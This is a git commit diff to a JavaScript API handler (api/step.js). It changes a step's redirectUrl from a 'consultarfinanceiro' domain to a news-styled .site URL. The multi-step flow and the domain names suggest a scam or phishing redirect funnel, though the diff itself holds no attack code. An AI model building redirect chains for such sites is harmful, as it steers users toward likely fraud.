4611c5020a22bb6e3d59059048377c9e9e0c0534
agenciaamicis <agenciaamicis@bol.com.br>
2025-09-20 22:33:05 -0300

    Update step.js

--- api/step.js
+++ api/step.js
@@ -80,7 +80,7 @@ export default function handler(req, res) {
       userData: {
         verified: true
       },
-      redirectUrl: "https://consultarfinanceiro.name/"
+      redirectUrl: "http://asnoticiasagora.site/vlr-na/"
     }
   };
 
@@ -95,5 +95,6 @@ export default function handler(req, res) {
   // Retornar o step
   res.status(200).json(steps[stepId]);
 }
+
 
 
